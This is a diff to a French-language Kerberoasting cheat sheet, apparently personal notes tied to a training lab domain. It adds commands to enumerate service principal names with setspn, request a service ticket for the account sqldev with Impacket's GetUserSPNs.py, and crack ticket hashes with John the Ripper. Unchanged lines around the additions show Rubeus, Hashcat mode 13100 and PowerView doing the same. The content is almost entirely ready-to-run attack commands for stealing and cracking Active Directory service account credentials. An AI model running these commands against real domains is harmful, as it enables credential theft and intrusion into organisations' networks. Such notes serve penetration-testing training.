@@ -67,10 +67,22 @@ Voici une liste d’outils populaires pour mener une attaque Kerberoasting :
 Rubeus.exe kerberoast
 ```
 
+Énumération des SPN avec setspn.exe
+
+```
+setspn.exe -Q */*
+```
+
 ### 💣 Cracker le hash avec Hashcat
 
 ```bash
 hashcat -m 13100 -a 0 hash.txt wordlist.txt
+```
+
+john 
+
+```
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt SAP.hash 
 ```
 
 ---
@@ -109,6 +121,12 @@ Extraire un TGS au format Hashcat :
 
 ```powershell
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+
+Demander un seul TGS
+
+```powershell
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
 ```
 
 Exporter tous les tickets  vers un fichier CSV:
